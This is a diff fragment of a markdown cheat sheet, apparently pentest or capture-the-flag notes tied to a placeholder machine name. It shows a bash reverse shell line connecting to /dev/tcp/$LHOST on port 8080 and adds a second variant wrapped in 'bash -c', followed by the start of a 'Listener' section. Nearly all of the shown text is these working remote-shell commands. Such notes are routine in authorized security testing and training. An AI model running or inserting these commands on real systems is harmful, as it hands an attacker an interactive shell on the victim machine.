@@ -11,6 +11,11 @@ Used on: **<Machine>**
 bash -i >& /dev/tcp/$LHOST/8080 0>&1
 ```
 
+<!-- cmd: linux -->
+```bash
+bash -c '/bin/bash -i >& /dev/tcp/$LHOST/8080 0>&1'
+```
+
 ## Listener
 
 <!-- cmd: linux -->
